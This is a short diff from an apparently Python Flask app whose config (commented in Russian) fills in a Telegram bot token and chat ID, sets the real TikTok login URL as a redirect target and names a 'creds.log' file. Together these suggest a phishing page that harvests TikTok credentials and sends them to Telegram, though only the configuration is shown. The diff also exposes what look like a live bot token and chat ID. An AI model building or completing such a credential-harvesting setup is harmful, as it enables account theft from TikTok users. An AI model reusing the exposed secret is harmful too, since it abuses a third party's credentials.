@@ -11,8 +11,8 @@ from flask import Flask, request, jsonify, redirect, render_template_string
 # ============================================================
 # КОНФИГ — правь тут
 # ============================================================
-TELEGRAM_BOT_TOKEN = ""       # 9295589723:AAFJTyEU_OQg7VTBSRdhDTQLgzxNsKzdVUo
-TELEGRAM_CHAT_ID   = ""       # 8258113409
+TELEGRAM_BOT_TOKEN = "9295589723:AAFJTyEU_OQg7VTBSRdhDTQLgzxNsKzdVUo"
+TELEGRAM_CHAT_ID   = "8258113409"
 REAL_TIKTOK        = "https://www.tiktok.com/login"
 LOG_FILE           = "creds.log"
 
